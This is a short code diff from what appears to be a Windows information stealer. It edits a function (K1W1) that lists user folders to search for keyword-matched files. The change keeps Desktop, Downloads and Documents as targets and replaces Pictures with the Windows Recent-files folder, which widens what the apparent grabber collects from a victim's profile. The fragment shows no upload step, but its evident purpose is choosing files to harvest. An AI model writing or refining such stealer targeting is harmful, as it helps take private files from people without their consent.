@@ -1212,10 +1212,10 @@ def K1W1F113(path, keywords):
 def K1W1():
     user = temp.split("\AppData")[0]
     path2search = [
-        user + "/Desktop",
-        user + "/Downloads",
-        user + "/Documents",
-        user + "/Pictures",
+        user    + "/Desktop",
+        user    + "/Downloads",
+        user    + "/Documents",
+        roaming + "/Microsoft/Windows/Recent",
     ]
 
     key_wordsFolder = [
